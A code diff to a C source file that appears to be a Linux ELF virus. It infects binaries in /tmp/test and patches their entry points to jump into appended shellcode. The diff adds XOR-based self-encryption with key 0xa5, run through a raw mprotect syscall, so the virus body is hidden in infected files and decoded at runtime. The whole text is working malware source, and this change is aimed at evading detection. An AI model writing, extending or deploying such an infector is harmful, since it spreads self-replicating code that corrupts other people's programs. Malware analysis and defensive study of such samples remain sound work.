@@ -1,10 +1,12 @@
 static void  start(void) {}
 #define _FCNTL_H
+#define _SYS_MMAN_H
 #include <linux/stat.h>
 #include <stddef.h>
 #include <sys/types.h>
 #include <bits/stat.h>
 #include <bits/fcntl.h>
+#include <bits/mman.h>
 #include <stdio.h>
 #include <signal.h>
 #include <dirent.h>
@@ -12,6 +14,7 @@ static void  start(void) {}
 
 #define BUF_SIZE 1024 * 1024 * 5
 #define PAYLOAD "HelloWorld"
+#define MAP_FAILED	((void *) -1)
 
 typedef off_t off64_t;
 typedef ino_t ino64_t;
@@ -26,14 +29,19 @@ struct  linux_dirent {
 static void end(void);
 static void lambdaEnd(void);
 static void lambdaStart(void);
+static void encryptStart(void);
 static size_t strlen(const char *s);
 static int  infectBins(const char *dirname);
 static void *memcpy(void *dest, const void *src, size_t);
+static int unObfuscate(void);
 
 int   entry_point(void *magic) {
   char    infectDir[] = "/tmp/test";
   char    infectDir2[] = "/tmp/test2";
 
+  if (magic != (void *)0x42)
+    if (unObfuscate() == -1)
+      return (1);
   if (infectBins(infectDir) == -1)
     return (1);
   /* if (infectBins(infectDir2) == -1) */
@@ -57,6 +65,43 @@ int   entry_point(void *magic) {
   asm("jmp endSC");
 }
 
+static int  mprotect(void *addr, size_t len, int prot) {
+  register int    rax asm("rax") = 10;
+  register void   *rdi asm("rdi") = addr;
+  register size_t rsi asm("rsi") = len;
+  register int    rdx asm("rdx") = prot;
+
+  asm("syscall"
+    : "=r" (rax));
+  return (rax);
+}
+
+static void *align(size_t value) {
+  return (void *)(((value + (4096 - 1)) & -4096) - 4096);
+}
+
+static int unObfuscate(void) {
+  size_t  i;
+  size_t  size;
+  char    *code;
+  void    *aligned;
+
+  size = ((void *)end) - ((void *)encryptStart);
+  aligned = align((size_t)encryptStart);
+  if (mprotect(aligned, size + ((void *)encryptStart - aligned), PROT_WRITE | PROT_EXEC | PROT_READ) < 0)
+    return (-1);
+  i = 0;
+  code = (void *)encryptStart;
+  while (i < size) {
+    code[i] ^= 0xa5;
+    i += 1;
+  }
+  if (mprotect(aligned, size + ((void *)encryptStart - aligned), PROT_EXEC | PROT_READ) < 0)
+    return (-1);
+  return (0);
+}
+
+static void encryptStart(void) {}
 static int  write(int fd, const void *buf, size_t count) {
   register int        rax asm("rax") = 1;
   register int        rdi asm("rdi") = fd;
@@ -213,8 +258,6 @@ static void  *memmove(void *dest, const void *src, size_t n) {
 
 /* } */
 
-#include <sys/mman.h>
-
 struct bfile {
   int         fd;
   off_t       size;
@@ -309,6 +352,16 @@ static void  appendSignature(struct bfile file, size_t offset) {
   memcpy(((void *)file.header) + offset, payload, toAdd);
 }
 
+static void obfuscate(char *header, size_t size) {
+  size_t  i;
+
+  i = 0;
+  while (i < size) {
+    header[i] ^= 0xa5;
+    i += 1;
+  }
+}
+
 static int  appendShellcode(struct bfile *bin) {
   size_t  size;
   char    ins[5];
@@ -321,6 +374,7 @@ static int  appendShellcode(struct bfile *bin) {
     return (-1);
   memcpy(new.header, bin->header, bin->size);
   memcpy(((void *)new.header) + bin->size, start, size);
+  obfuscate(((void *)new.header) + bin->size + (encryptStart - start), end - encryptStart);
   address = -(0xc000000 + bin->size - bin->header->e_entry + size + 5);
   ins[0] = 0xe9;
   ins[1] = (address >> 0) & 0xff;
